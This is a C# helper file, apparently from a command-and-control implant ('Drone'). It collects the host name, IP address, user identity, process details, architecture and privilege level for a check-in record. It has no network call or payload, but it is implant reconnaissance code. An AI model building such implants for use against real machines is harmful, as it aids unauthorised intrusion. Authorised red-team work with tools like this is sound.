using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;

using Drone.Models;

namespace Drone.Utilities;

public static class Helpers
{
    internal static Metadata GenerateMetadata()
    {
        var hostname = Dns.GetHostName();
        var addresses = Dns.GetHostAddresses(hostname);
        
        using var self = Process.GetCurrentProcess();
        using var identity = WindowsIdentity.GetCurrent();

        return new Metadata
        {
            Id = Guid.NewGuid().ConvertToShortGuid(),
            Identity = identity.Name,
            Hostname = hostname,
            Address = addresses.LastOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)?.ToString(),
            Process = self.ProcessName,
            ProcessId = self.Id,
            Integrity = GetProcessIntegrity(identity),
            Architecture = Environment.Is64BitProcess ? ProcessArch.X64 : ProcessArch.X86
        };
    }

    public static string GetRandomString(int length)
    {
        const string chars = "1234567890qwertyuiopasdfghjklzxcvbnm";
        var rand = new Random();
        
        return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[rand.Next(s.Length)]).ToArray());
    }

    private static ProcessIntegrity GetProcessIntegrity(WindowsIdentity identity)
    {
        if (identity.Name.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
            return ProcessIntegrity.SYSTEM;

        var principal = new WindowsPrincipal(identity);
        
        return principal.IsInRole(WindowsBuiltInRole.Administrator)
            ? ProcessIntegrity.HIGH
            : ProcessIntegrity.MEDIUM;
    }
}